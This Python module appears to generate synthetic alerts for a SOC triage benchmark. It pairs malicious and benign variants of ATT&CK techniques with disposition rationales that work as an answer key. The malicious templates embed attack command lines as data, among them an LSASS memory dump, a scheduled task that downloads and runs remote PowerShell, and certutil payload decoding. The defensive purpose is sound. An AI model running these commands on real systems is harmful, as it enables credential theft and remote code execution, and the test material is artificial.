"""Per-technique alert templates.

One builder per (technique, variant). A builder returns a fully constructed
ASIM event plus the detection metadata a SOC console would show, and the
rationale explaining why the correct disposition is what it is.

The rationale is the important part. Every alert here should be resolvable by
reasoning over the alert plus enrichment, and the rationale records the chain.
If a rationale reads "because the technique is malicious," the alert is not a
test case, it is a lookup table entry.

Benign variants are built from the same detections as their malicious
counterparts. The rule fires identically; only the context differs. That is
what makes false-positive rate meaningful: the agent cannot separate them on
the signature name alone.

Builders are deterministic given an rng and a timestamp, so the corpus is
reproducible.
"""

from __future__ import annotations

import random
from collections.abc import Callable
from datetime import datetime
from enum import Enum
from typing import Any, Optional

from pydantic import BaseModel, ConfigDict

from soc_triage import environment as env
from soc_triage.corpus.authentication_event import AuthenticationEvent
from soc_triage.corpus.file_event import FileEvent
from soc_triage.corpus.network_session_event import NetworkSessionEvent
from soc_triage.corpus.process_event import ProcessEvent
from soc_triage.corpus.schema import AsimEventSeverity


class Variant(str, Enum):
    MALICIOUS = "malicious"
    BENIGN = "benign"


class TemplateResult(BaseModel):
    """One generated alert, before it gets an ID and a label."""

    model_config = ConfigDict(extra="forbid", arbitrary_types_allowed=True)

    event: Any
    title: str
    severity: AsimEventSeverity
    entity_summary: str
    rationale: str
    abstention_acceptable: bool = False


# --------------------------------------------------------------------------
# Scaffolding helpers. These fill the ASIM fields that every event needs so
# the builders below carry only what distinguishes one technique from another.
# --------------------------------------------------------------------------

def _common(ts: datetime, product: str, vendor: str, severity: str) -> dict:
    return {
        "TimeGenerated": ts,
        "EventStartTime": ts,
        "EventEndTime": ts,
        "EventProduct": product,
        "EventVendor": vendor,
        "EventSeverity": severity,
    }


def _pid(rng: random.Random) -> str:
    return str(rng.randrange(1000, 9999))


def _sha256(rng: random.Random) -> str:
    return "".join(rng.choice("0123456789abcdef") for _ in range(64))


def _proc_event(
    ts: datetime, host: env.Host, actor: env.User, *, severity: str,
    target_process: str, command_line: str,
    parent_process: Optional[str] = None,
    acting_process: Optional[str] = None,
    rng: random.Random, **extra,
) -> ProcessEvent:
    acting = acting_process or parent_process or "C:\\Windows\\System32\\cmd.exe"
    acting_pid = _pid(rng)
    return ProcessEvent(
        **_common(ts, "Microsoft Defender XDR for Endpoint", "Microsoft", severity),
        EventType="ProcessCreated", EventResult="Success",
        DvcHostname=host.hostname, DvcIpAddr=host.ip_addr,
        DvcDomain=env.DOMAIN, DvcOs="Windows",
        ActorUsername=actor.username, ActingProcessId=acting_pid,
        ActingProcessName=acting,
        ParentProcessName=parent_process or acting, ParentProcessId=acting_pid,
        TargetUsername=actor.username,
        TargetProcessName=target_process,
        TargetProcessFilename=target_process.rsplit("\\", 1)[-1],
        TargetProcessCommandLine=command_line,
        TargetProcessId=_pid(rng),
        **extra,
    )


def _auth_event(
    ts: datetime, target_user: env.User, *, severity: str, result: str,
    event_result_details: Optional[str] = None, sub_type: str,
    src: Optional[env.ExternalAddress] = None,
    src_host: Optional[env.Host] = None,
    target_host: Optional[env.Host] = None, **extra,
) -> AuthenticationEvent:
    fields: dict = {}
    if src is not None:
        fields.update(SrcIpAddr=src.ip_addr, SrcGeoCountry=src.geo_country,
                      SrcGeoCity=src.geo_city, SrcIsp=src.isp)
    if src_host is not None:
        fields.update(SrcIpAddr=src_host.ip_addr, SrcHostname=src_host.hostname)
    if target_host is not None:
        fields.update(TargetHostname=target_host.hostname)
    return AuthenticationEvent(
        **_common(ts, "Microsoft Entra ID", "Microsoft", severity),
        EventType="Logon", EventResult=result,
        EventResultDetails=event_result_details, EventSubType=sub_type,
        DvcHostname="AAD-STS", DvcDomain=env.DOMAIN,
        TargetUsername=target_user.username, TargetUserId=target_user.user_id,
        TargetDomain=env.DOMAIN,
        **fields, **extra,
    )


def _file_event(
    ts: datetime, host: env.Host, actor: env.User, *, severity: str,
    event_type: str, target_path: str,
    acting_process: Optional[str] = None,
    acting_cmdline: Optional[str] = None,
    rng: random.Random, **extra,
) -> FileEvent:
    return FileEvent(
        **_common(ts, "Sysmon", "Microsoft", severity),
        EventType=event_type, EventResult="Success",
        DvcHostname=host.hostname, DvcIpAddr=host.ip_addr,
        DvcDomain=env.DOMAIN, DvcOs="Windows",
        ActorUsername=actor.username, ActorUserId=actor.user_id,
        ActingProcessName=acting_process, ActingProcessId=_pid(rng),
        ActingProcessCommandLine=acting_cmdline,
        TargetFilePath=target_path, TargetFilePathType="Windows Local",
        TargetFileName=target_path.rsplit("\\", 1)[-1],
        TargetFileExtension=target_path.rsplit(".", 1)[-1],
        **extra,
    )


def _net_event(
    ts: datetime, *, severity: str, event_type: str, result: str,
    dvc_host: str, action: str,
    src_ip: str, dst_ip: str, dst_port: int,
    src_host: Optional[str] = None, dst_host: Optional[str] = None,
    **extra,
) -> NetworkSessionEvent:
    return NetworkSessionEvent(
        **_common(ts, "PanOS", "Palo Alto", severity),
        EventType=event_type, EventResult=result,
        DvcHostname=dvc_host, DvcAction=action,
        NetworkProtocol="TCP",
        SrcIpAddr=src_ip, SrcHostname=src_host,
        DstIpAddr=dst_ip, DstPortNumber=dst_port, DstHostname=dst_host,
        **extra,
    )


# --------------------------------------------------------------------------
# Credential Access
# --------------------------------------------------------------------------

def t1003_001_malicious(rng: random.Random, ts: datetime) -> TemplateResult:
    host = rng.choice([h for h in env.HOSTS if h.hostname.endswith(("0142", "0087", "0311"))])
    actor = env.user_by_name(f"{env.DOMAIN}\\svc_backup")
    dump = rng.choice(["C:\\Users\\Public\\out.dmp", "C:\\Windows\\Temp\\lsass.dmp"])
    return TemplateResult(
        event=_proc_event(
            ts, host, actor, severity="High", rng=rng,
            target_process="C:\\Windows\\System32\\rundll32.exe",
            command_line=f"rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump {rng.randrange(500, 900)} {dump} full",
            parent_process="C:\\Windows\\System32\\cmd.exe",
            TargetProcessIntegrityLevel="high",
            RuleName="Credential dumping via comsvcs.dll MiniDump",
            ThreatName="LSASS memory access", ThreatCategory="CredentialAccess",
            ThreatRiskLevel=88, ThreatConfidence=90,
        ),
        title="Credential dumping via comsvcs.dll MiniDump",
        severity="High",
        entity_summary=f"{host.hostname} / {actor.username} / rundll32.exe",
        rationale=(
            "comsvcs.dll MiniDump against a process ID with output to a world-writable "
            "path is a credential-dumping pattern with no administrative equivalent. "
            f"The actor is a service account that enrichment shows should run only from "
            f"FILE-SRV-03, not from a {host.department} workstation."
        ),
    )


def t1110_003_malicious(rng: random.Random, ts: datetime) -> TemplateResult:
    src = env.address_by_ip("45.148.10.77")
    user = rng.choice([u for u in env.USERS if u.account_type is env.AccountType.STANDARD])
    return TemplateResult(
        event=_auth_event(
            ts, user, severity="Medium", result="Failure",
            event_result_details="Incorrect password", sub_type="Remote", src=src,
            LogonMethod="Username & Password", LogonProtocol="OAuth2",
            SrcRiskLevel=78, HttpUserAgent="python-requests/2.31.0",
            TargetAppName="Office 365 Exchange Online",
            RuleName="Password spray: repeated failures across accounts from single source",
            ThreatName="Password spraying", ThreatCategory="CredentialAccess",
            ThreatRiskLevel=72, ThreatConfidence=80, ThreatField="SrcIpAddr",
        ),
        title="Password spray: repeated failures across accounts from single source",
        severity="Medium",
        entity_summary=f"{user.username} / {src.ip_addr} / {src.geo_city}",
        rationale=(
            f"Authentication failures across multiple accounts from {src.ip_addr}, a "
            f"{src.isp} range that threat intel rates malicious. A scripted user agent "
            "and a geography with no staff presence rule out user error."
        ),
    )


# --------------------------------------------------------------------------
# Initial Access
# --------------------------------------------------------------------------

def t1078_malicious(rng: random.Random, ts: datetime) -> TemplateResult:
    src = rng.choice([env.address_by_ip("45.148.10.77"), env.address_by_ip("103.75.190.21")])
    user = env.user_by_name(f"{env.DOMAIN}\\svc_backup")
    return TemplateResult(
        event=_auth_event(
            ts, user, severity="High", result="Success", sub_type="RemoteInteractive",
            src=src, LogonMethod="Username & Password",
            SrcRiskLevel=70 if src.reputation is env.Reputation.MALICIOUS else 45,
            TargetHostname="FILE-SRV-03",
            RuleName="Service account interactive logon from external address",
            ThreatName="Valid account misuse", ThreatCategory="InitialAccess",
            ThreatRiskLevel=80, ThreatConfidence=75, ThreatField="SrcIpAddr",
        ),
        title="Service account interactive logon from external address",
        severity="High",
        entity_summary=f"{user.username} / {src.ip_addr} / interactive",
        rationale=(
            "A service account authenticated interactively from outside the network. "
            "Enrichment shows this account runs unattended from FILE-SRV-03 and should "
            "never log on interactively, so the logon type alone is disqualifying "
            "regardless of the source address reputation."
        ),
    )


def t1078_benign(rng: random.Random, ts: datetime) -> TemplateResult:
    src = env.address_by_ip("198.51.100.14")
    user = rng.choice([u for u in env.USERS if u.account_type is env.AccountType.STANDARD])
    host = rng.choice([h for h in env.HOSTS if h.department == user.department] or list(env.HOSTS))
    return TemplateResult(
        event=_auth_event(
            ts, user, severity="Low", result="Success", sub_type="RemoteInteractive",
            src=src, LogonMethod="Multi factor authentication",
            SrcRiskLevel=5, TargetHostname=host.hostname,
            RuleName="Interactive logon from a previously unseen source address",
            ThreatCategory="InitialAccess", ThreatRiskLevel=15, ThreatConfidence=30,
        ),
        title="Interactive logon from a previously unseen source address",
        severity="Low",
        entity_summary=f"{user.username} / {src.ip_addr} / MFA",
        rationale=(
            f"The source address is the corporate VPN concentrator, which enrichment "
            "rates clean. The account is a standard user in the department that owns the "
            "target host, and the logon completed with MFA. New-source detections fire on "
            "remote staff routinely."
        ),
    )


def t1190_malicious(rng: random.Random, ts: datetime) -> TemplateResult:
    src = rng.choice([env.address_by_ip("185.220.101.44"), env.address_by_ip("103.75.190.21")])
    web = env.host_by_name("WEB-PRD-02")
    threat = rng.choice([
        ("Java deserialization RCE", "Deserialization RCE attempt in HTTP body"),
        ("Path traversal to config file", "Directory traversal in request URI"),
    ])
    return TemplateResult(
        event=_net_event(
            ts, severity="High", event_type="IDS", result="Failure",
            dvc_host="PA-EDGE-01", action="Reset Source",
            src_ip=src.ip_addr, dst_ip=web.ip_addr, dst_port=443,
            dst_host=web.hostname,
            NetworkApplicationProtocol="HTTPS", NetworkDirection="Inbound",
            SrcBytes=rng.randrange(900, 4000), DstBytes=0,
            SrcGeoCountry=src.geo_country, SrcZone="Internet", DstZone="Dmz",
            DstDescription=web.role,
            NetworkRuleName=threat[1], NetworkRuleNumber=rng.randrange(4000, 4999),
            ThreatName=threat[0], ThreatCategory="Exploit",
            ThreatRiskLevel=91, ThreatConfidence=85,
            ThreatIpAddr=src.ip_addr, ThreatField="SrcIpAddr",
        ),
        title=threat[1],
        severity="High",
        entity_summary=f"{src.ip_addr} -> {web.hostname}:443",
        rationale=(
            f"An exploit signature fired on inbound traffic to an internet-facing host "
            f"enrichment marks as high criticality. The source is a {src.reputation.value} "
            "address and the session was reset with zero bytes returned, so the attempt "
            "failed, but the targeting is deliberate."
        ),
    )


# --------------------------------------------------------------------------
# Execution
# --------------------------------------------------------------------------

def t1059_001_malicious(rng: random.Random, ts: datetime) -> TemplateResult:
    host = rng.choice([h for h in env.HOSTS if h.hostname.endswith(("0142", "0087"))])
    actor = rng.choice([u for u in env.USERS if u.account_type is env.AccountType.STANDARD])
    blob = "".join(rng.choice("ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/") for _ in range(120))
    return TemplateResult(
        event=_proc_event(
            ts, host, actor, severity="High", rng=rng,
            target_process="C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
            command_line=f"powershell.exe -nop -w hidden -ep bypass -enc {blob}",
            parent_process="C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
            TargetProcessIntegrityLevel="medium",
            RuleName="Encoded PowerShell spawned by Office application",
            ThreatName="Suspicious PowerShell execution", ThreatCategory="Execution",
            ThreatRiskLevel=84, ThreatConfidence=88,
        ),
        title="Encoded PowerShell spawned by Office application",
        severity="High",
        entity_summary=f"{host.hostname} / {actor.username} / powershell.exe",
        rationale=(
            "Word spawning a hidden, execution-policy-bypassed PowerShell with a base64 "
            "payload has no legitimate business equivalent. The parent-child relationship "
            "is the signal; the encoding is the confirmation."
        ),
    )


def t1059_001_benign(rng: random.Random, ts: datetime) -> TemplateResult:
    host = rng.choice([h for h in env.HOSTS if h.department == "IT"])
    actor = env.user_by_name(f"{env.DOMAIN}\\k.iverson")
    script = rng.choice(["Invoke-DiskCleanup.ps1", "Get-CertExpiry.ps1", "Rotate-Logs.ps1"])
    return TemplateResult(
        event=_proc_event(
            ts, host, actor, severity="Low", rng=rng,
            target_process="C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
            command_line=f"powershell.exe -ExecutionPolicy RemoteSigned -File \\\\SCCM-01\\scripts$\\{script}",
            parent_process="C:\\Windows\\explorer.exe",
            TargetProcessIntegrityLevel="high",
            RuleName="PowerShell execution with policy override",
            ThreatCategory="Execution", ThreatRiskLevel=20, ThreatConfidence=35,
        ),
        title="PowerShell execution with policy override",
        severity="Low",
        entity_summary=f"{host.hostname} / {actor.username} / {script}",
        rationale=(
            "A named maintenance script runs from the signed script share on the "
            "deployment server, launched interactively by a server administrator whose "
            "enrichment record notes routine maintenance scripting is expected. "
            "RemoteSigned is the standard corporate policy, not a bypass."
        ),
    )


def t1204_002_malicious(rng: random.Random, ts: datetime) -> TemplateResult:
    host = rng.choice([h for h in env.HOSTS if h.hostname.endswith(("0142", "0087", "0311"))])
    actor = rng.choice([u for u in env.USERS if u.account_type is env.AccountType.STANDARD])
    lure = rng.choice(["Invoice_49122.pdf.exe", "Payroll_Adjustment.xlsm", "DHL_Shipping_Label.scr"])
    path = f"C:\\Users\\{actor.username.split(chr(92))[1]}\\Downloads\\{lure}"
    return TemplateResult(
        event=_file_event(
            ts, host, actor, severity="High", rng=rng,
            event_type="FileCreated", target_path=path,
            acting_process="C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE",
            TargetFileSize=rng.randrange(180_000, 900_000),
            TargetFileSHA256=_sha256(rng),
            RuleName="Executable content written from mail client to user profile",
            ThreatName="Malicious attachment", ThreatCategory="Trojan",
            ThreatRiskLevel=86, ThreatConfidence=82,
            ThreatFilePath=path, ThreatField="DstFilePath", ThreatIsActive=True,
        ),
        title="Executable content written from mail client to user profile",
        severity="High",
        entity_summary=f"{host.hostname} / {actor.username} / {lure}",
        rationale=(
            "The mail client wrote executable content to the user's Downloads folder, and "
            "the filename uses a double extension to disguise the type. Antivirus "
            "inspection flagged the file as an active threat."
        ),
    )


# --------------------------------------------------------------------------
# Persistence
# --------------------------------------------------------------------------

def t1053_005_malicious(rng: random.Random, ts: datetime) -> TemplateResult:
    host = rng.choice([h for h in env.HOSTS if h.hostname.endswith(("0142", "0087", "0311"))])
    actor = rng.choice([u for u in env.USERS if u.account_type is env.AccountType.STANDARD])
    name = rng.choice(["WindowsUpdateSvc", "AdobeSyncTask", "OneDriveHealth"])
    return TemplateResult(
        event=_proc_event(
            ts, host, actor, severity="High", rng=rng,
            target_process="C:\\Windows\\System32\\schtasks.exe",
            command_line=(
                f'schtasks.exe /create /sc minute /mo 5 /tn "{name}" /tr '
                f'"powershell.exe -w hidden -c IEX(New-Object Net.WebClient).DownloadString(\'http://{rng.randrange(1,254)}.75.190.21/a\')" /f'
            ),
            parent_process="C:\\Windows\\System32\\cmd.exe",
            RuleName="Scheduled task created with network download payload",
            ThreatName="Scheduled task persistence", ThreatCategory="Persistence",
            ThreatRiskLevel=87, ThreatConfidence=89,
        ),
        title="Scheduled task created with network download payload",
        severity="High",
        entity_summary=f"{host.hostname} / {actor.username} / {name}",
        rationale=(
            "A five-minute recurring task launches hidden PowerShell that downloads and "
            "executes remote code. The task name imitates a Microsoft service, and the "
            "creating account is a standard user with no deployment role."
        ),
    )


def t1053_005_benign(rng: random.Random, ts: datetime) -> TemplateResult:
    host = rng.choice([h for h in env.HOSTS if h.criticality is not env.Criticality.CROWN_JEWEL])
    actor = env.user_by_name(f"{env.DOMAIN}\\svc_sccm")
    name = rng.choice(["CM_Hardware_Inventory", "CM_Software_Metering", "CM_Compliance_Eval"])
    return TemplateResult(
        event=_proc_event(
            ts, host, actor, severity="Low", rng=rng,
            target_process="C:\\Windows\\System32\\schtasks.exe",
            command_line=f'schtasks.exe /create /sc daily /st 02:00 /tn "{name}" /tr "C:\\Windows\\CCM\\CcmExec.exe" /ru SYSTEM /f',
            parent_process="C:\\Windows\\CCM\\CcmExec.exe",
            RuleName="Scheduled task created on managed endpoint",
            ThreatCategory="Persistence", ThreatRiskLevel=18, ThreatConfidence=30,
        ),
        title="Scheduled task created on managed endpoint",
        severity="Low",
        entity_summary=f"{host.hostname} / {actor.username} / {name}",
        rationale=(
            "The task was created by the deployment service account, whose enrichment "
            "record states it creates scheduled tasks on managed endpoints. The parent "
            "process is the configuration manager agent and the payload is a signed local "
            "binary on a daily schedule."
        ),
    )


def t1547_001_malicious(rng: random.Random, ts: datetime) -> TemplateResult:
    host = rng.choice([h for h in env.HOSTS if h.hostname.endswith(("0142", "0087", "0311"))])
    actor = rng.choice([u for u in env.USERS if u.account_type is env.AccountType.STANDARD])
    short = actor.username.split("\\")[1]
    lnk = rng.choice(["svc.lnk", "OneDriveSync.lnk", "updater.lnk"])
    path = f"C:\\Users\\{short}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\{lnk}"
    return TemplateResult(
        event=_file_event(
            ts, host, actor, severity="Medium", rng=rng,
            event_type="FileCreated", target_path=path,
            acting_process="C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
            acting_cmdline=f"powershell.exe -w hidden -c Copy-Item $env:TEMP\\{lnk} '$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\'",
            TargetFileSize=rng.randrange(900, 2400), TargetFileSHA256=_sha256(rng),
            RuleName="Shortcut written to user Startup folder by scripting host",
            ThreatName="Startup folder persistence", ThreatCategory="Persistence",
            ThreatRiskLevel=68, ThreatConfidence=75,
            ThreatFilePath=path, ThreatField="DstFilePath", ThreatIsActive=True,
        ),
        title="Shortcut written to user Startup folder by scripting host",
        severity="Medium",
        entity_summary=f"{host.hostname} / {actor.username} / {lnk}",
        rationale=(
            "A hidden PowerShell process copied a shortcut from the temp directory into "
            "the user's Startup folder. Legitimate software installs persistence through "
            "an installer, not a hidden scripting host copying from TEMP."
        ),
    )


# --------------------------------------------------------------------------
# Discovery
# --------------------------------------------------------------------------

def t1087_002_malicious(rng: random.Random, ts: datetime) -> TemplateResult:
    host = rng.choice([h for h in env.HOSTS if h.department in ("Finance", "Human Resources")])
    actor = rng.choice([u for u in env.USERS
                        if u.account_type is env.AccountType.STANDARD
                        and u.department in ("Finance", "Human Resources")])
    cmd = rng.choice([
        'net.exe group "Domain Admins" /domain',
        'net.exe group "Enterprise Admins" /domain',
    ])
    return TemplateResult(
        event=_proc_event(
            ts, host, actor, severity="Medium", rng=rng,
            target_process="C:\\Windows\\System32\\net.exe",
            command_line=cmd,
            parent_process="C:\\Windows\\System32\\cmd.exe",
            RuleName="Privileged group enumeration from user workstation",
            ThreatName="Domain account discovery", ThreatCategory="Discovery",
            ThreatRiskLevel=64, ThreatConfidence=70,
        ),
        title="Privileged group enumeration from user workstation",
        severity="Medium",
        entity_summary=f"{host.hostname} / {actor.username} / net.exe",
        rationale=(
            f"A {host.department} user enumerated domain administrators from a "
            "departmental workstation. Enrichment shows no service-desk or IT role on "
            "this account, and the host carries no directory-tools tag."
        ),
    )


def t1087_002_benign(rng: random.Random, ts: datetime) -> TemplateResult:
    host = env.host_by_name("HELPDESK-0012")
    actor = env.user_by_name(f"{env.DOMAIN}\\t.brennan")
    cmd = rng.choice(['net.exe user /domain', 'net.exe group "Domain Users" /domain'])
    return TemplateResult(
        event=_proc_event(
            ts, host, actor, severity="Low", rng=rng,
            target_process="C:\\Windows\\System32\\net.exe",
            command_line=cmd,
            parent_process="C:\\Windows\\System32\\cmd.exe",
            RuleName="Directory enumeration from workstation",
            ThreatCategory="Discovery", ThreatRiskLevel=15, ThreatConfidence=25,
        ),
        title="Directory enumeration from workstation",
        severity="Low",
        entity_summary=f"{host.hostname} / {actor.username} / net.exe",
        rationale=(
            "The query enumerates ordinary domain users rather than privileged groups, "
            "runs from the service-desk workstation tagged for directory tools, and the "
            "account's enrichment record notes account lookups are part of onboarding."
        ),
    )


def t1046_malicious(rng: random.Random, ts: datetime) -> TemplateResult:
    src = env.host_by_name("ENG-WKS-0311")
    dst = rng.choice([h for h in env.HOSTS if h.hostname in ("DC-01", "FILE-SRV-03", "SCCM-01")])
    port = rng.choice([445, 3389, 22, 1433])
    return TemplateResult(
        event=_net_event(
            ts, severity="Medium", event_type="NetworkSession", result="Failure",
            dvc_host="PA-CORE-01", action="Drop",
            src_ip=src.ip_addr, src_host=src.hostname,
            dst_ip=dst.ip_addr, dst_host=dst.hostname, dst_port=port,
            NetworkDirection="Local", EventSubType="Start",
            SrcBytes=rng.randrange(40, 120), DstBytes=0,
            SrcPackets=1, DstPackets=0, SrcZone="Corp", DstZone="Server",
            NetworkRuleName="Horizontal port sweep from workstation subnet",
            NetworkRuleNumber=rng.randrange(2000, 2999),
            ThreatName="Network service discovery", ThreatCategory="Discovery",
            ThreatRiskLevel=62, ThreatConfidence=68,
        ),
        title="Horizontal port sweep from workstation subnet",
        severity="Medium",
        entity_summary=f"{src.hostname} -> {dst.hostname}:{port}",
        rationale=(
            "A workstation issued single-packet connection attempts across server "
            "infrastructure ports and was dropped. Enrichment shows this host carries no "
            "scanning authorization, so the scan originates from an endpoint that should "
            "never perform one."
        ),
    )


def t1046_benign(rng: random.Random, ts: datetime) -> TemplateResult:
    src = env.host_by_name("SEC-SCAN-01")
    dst = rng.choice([h for h in env.HOSTS if h.hostname != src.hostname])
    port = rng.choice([445, 3389, 22, 443])
    return TemplateResult(
        event=_net_event(
            ts, severity="Low", event_type="NetworkSession", result="Failure",
            dvc_host="PA-CORE-01", action="Drop",
            src_ip=src.ip_addr, src_host=src.hostname,
            dst_ip=dst.ip_addr, dst_host=dst.hostname, dst_port=port,
            NetworkDirection="Local", EventSubType="Start",
            SrcBytes=rng.randrange(40, 120), DstBytes=0,
            SrcPackets=1, DstPackets=0, SrcZone="Corp", DstZone="Server",
            SrcDescription=src.role,
            NetworkRuleName="Horizontal port sweep from workstation subnet",
            NetworkRuleNumber=rng.randrange(2000, 2999),
            ThreatCategory="Discovery", ThreatRiskLevel=12, ThreatConfidence=20,
        ),
        title="Horizontal port sweep from workstation subnet",
        severity="Low",
        entity_summary=f"{src.hostname} -> {dst.hostname}:{port}",
        rationale=(
            "The same sweep signature fires, but the source is the host enrichment tags "
            "as the authorized vulnerability scanner. Nothing in the network evidence "
            "distinguishes this from the malicious variant; only asset context does."
        ),
    )


# --------------------------------------------------------------------------
# Defense Evasion
# --------------------------------------------------------------------------

def t1027_malicious(rng: random.Random, ts: datetime) -> TemplateResult:
    host = rng.choice([h for h in env.HOSTS if h.hostname.endswith(("0142", "0087", "0311"))])
    actor = rng.choice([u for u in env.USERS if u.account_type is env.AccountType.STANDARD])
    return TemplateResult(
        event=_proc_event(
            ts, host, actor, severity="Medium", rng=rng,
            target_process="C:\\Windows\\System32\\certutil.exe",
            command_line=f"certutil.exe -decode C:\\Users\\Public\\{rng.choice(['cert.txt','data.b64','tmp.log'])} C:\\Users\\Public\\payload.exe",
            parent_process="C:\\Windows\\System32\\cmd.exe",
            RuleName="Certutil used to decode file to executable",
            ThreatName="Obfuscated payload staging", ThreatCategory="DefenseEvasion",
            ThreatRiskLevel=76, ThreatConfidence=80,
        ),
        title="Certutil used to decode file to executable",
        severity="Medium",
        entity_summary=f"{host.hostname} / {actor.username} / certutil.exe",
        rationale=(
            "Certutil is a certificate utility being used to decode base64 content into "
            "an executable in a world-writable directory. This is a living-off-the-land "
            "staging pattern; certificate work does not produce .exe output."
        ),
    )


def t1070_004_malicious(rng: random.Random, ts: datetime) -> TemplateResult:
    host = rng.choice([h for h in env.HOSTS if h.hostname.endswith(("0142", "0087", "0311"))])
    actor = rng.choice([u for u in env.USERS if u.account_type is env.AccountType.STANDARD])
    target = rng.choice([
        "C:\\Users\\Public\\payload.exe",
        "C:\\Windows\\Temp\\lsass.dmp",
        "C:\\Users\\Public\\out.dmp",
    ])
    return TemplateResult(
        event=_file_event(
            ts, host, actor, severity="High", rng=rng,
            event_type="FileDeleted", target_path=target,
            acting_process="C:\\Windows\\System32\\cmd.exe",
            acting_cmdline=f"cmd.exe /c del /f /q {target}",
            RuleName="Deletion of previously flagged artifact",
            ThreatName="Indicator removal", ThreatCategory="DefenseEvasion",
            ThreatRiskLevel=79, ThreatConfidence=77,
            ThreatFilePath=target, ThreatField="DstFilePath",
        ),
        title="Deletion of previously flagged artifact",
        severity="High",
        entity_summary=f"{host.hostname} / {actor.username} / {target.rsplit(chr(92), 1)[-1]}",
        rationale=(
            "A force-delete removed a file that earlier detections flagged on this host. "
            "Cleanup of staging artifacts immediately after their creation is anti-forensic "
            "behavior, and it raises the priority of the preceding alerts rather than "
            "closing them."
        ),
    )


TEMPLATES: dict[tuple[str, Variant], Callable[[random.Random, datetime], TemplateResult]] = {
    ("T1078", Variant.MALICIOUS): t1078_malicious,
    ("T1078", Variant.BENIGN): t1078_benign,
    ("T1190", Variant.MALICIOUS): t1190_malicious,
    ("T1110.003", Variant.MALICIOUS): t1110_003_malicious,
    ("T1003.001", Variant.MALICIOUS): t1003_001_malicious,
    ("T1059.001", Variant.MALICIOUS): t1059_001_malicious,
    ("T1059.001", Variant.BENIGN): t1059_001_benign,
    ("T1204.002", Variant.MALICIOUS): t1204_002_malicious,
    ("T1053.005", Variant.MALICIOUS): t1053_005_malicious,
    ("T1053.005", Variant.BENIGN): t1053_005_benign,
    ("T1547.001", Variant.MALICIOUS): t1547_001_malicious,
    ("T1087.002", Variant.MALICIOUS): t1087_002_malicious,
    ("T1087.002", Variant.BENIGN): t1087_002_benign,
    ("T1046", Variant.MALICIOUS): t1046_malicious,
    ("T1046", Variant.BENIGN): t1046_benign,
    ("T1027", Variant.MALICIOUS): t1027_malicious,
    ("T1070.004", Variant.MALICIOUS): t1070_004_malicious,
}
